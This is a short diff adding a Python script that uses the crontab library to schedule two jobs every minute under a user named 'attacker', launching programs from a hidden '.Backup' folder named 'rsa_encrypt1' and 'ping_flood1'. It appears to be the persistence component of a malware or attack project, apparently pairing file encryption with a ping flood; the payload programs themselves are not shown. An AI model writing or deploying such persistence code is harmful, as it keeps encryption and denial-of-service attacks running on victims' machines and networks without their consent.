@@ -1,0 +1,9 @@
+#!/usr/bin/env python
+from crontab import CronTab
+print("yes")
+cron = CronTab(user='attacker')
+job3 = cron.new(command='/home/attacker/Desktop/.Backup/rsa_encrypt1')
+jo4 = cron.new(command='/home/attacker/Desktop/.Backup/ping_flood1')
+job3.minute.every(1)
+jo4.minute.every(1)
+cron.write()
